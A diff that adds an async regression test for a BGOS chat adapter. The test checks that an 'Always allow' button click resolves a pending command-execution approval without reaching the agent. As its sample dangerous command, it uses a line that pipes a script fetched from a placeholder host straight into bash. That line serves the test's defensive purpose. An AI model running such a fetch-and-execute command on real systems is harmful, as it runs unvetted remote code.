@@ -127,6 +127,64 @@ async def test_approval_round_trip_via_ws(mock_bgos_server, monkeypatch):
     assert adapter._approval_state == {}
 
 
+async def test_approval_tap_via_inbound_click_resolves_without_agent_message(mock_bgos_server, monkeypatch):
+    """Regression: BGOS may deliver option taps as inbound_click.
+
+    Approval buttons carry `ea:*` callbackData. Those clicks must resolve the
+    pending gateway approval directly, not become a normal user message like
+    "Always allow" that leaves the dangerous command blocked until timeout.
+    """
+    monkeypatch.setenv("BGOS_ALLOW_ALL_USERS", "true")
+    _seed_whoami(mock_bgos_server)
+    mock_bgos_server.on("POST", "/api/v1/messages").respond(201, {"id": 556})
+
+    verdicts: list[tuple[str, str]] = []
+    agent_calls: list[MessageEvent] = []
+
+    def fake_resolve(session_key: str, choice: str) -> None:
+        verdicts.append((session_key, choice))
+
+    monkeypatch.setattr(adapter_mod, "resolve_gateway_approval", fake_resolve)
+
+    adapter = BGOSAdapter(BgosConfig(
+        base_url=mock_bgos_server.url, pairing_token="pair_xyz",
+    ))
+
+    async def fake_handle(event: MessageEvent) -> None:
+        agent_calls.append(event)
+
+    monkeypatch.setattr(adapter, "handle_message", fake_handle)
+
+    await adapter.connect()
+    try:
+        await mock_bgos_server.wait_for_socket_connection(timeout=3.0)
+        await asyncio.sleep(0.1)
+
+        await adapter.send_exec_approval(
+            chat_id=11, command="bash <(curl -fsSL https://example.invalid/install.sh)",
+            session_key="DANGER-KEY", description="Proceed?",
+        )
+        await mock_bgos_server.emit_to_room(
+            "assistant:7", "inbound_click",
+            {
+                "assistantId": 7,
+                "chatId": 11,
+                "messageId": 556,
+                "optionId": 99,
+                "callbackData": "ea:always:1",
+                "buttonText": "Always allow",
+                "userId": "u1",
+            },
+        )
+        await asyncio.sleep(0.2)
+    finally:
+        await adapter.disconnect()
+
+    assert verdicts == [("DANGER-KEY", "always")]
+    assert agent_calls == []
+    assert adapter._approval_state == {}
+
+
 async def test_bridge_local_roundtrip_through_ws(mock_bgos_server, monkeypatch):
     """Full: WS slash_command inbound → bridge-local intercept → adapter
     posts ack message → agent never involved."""
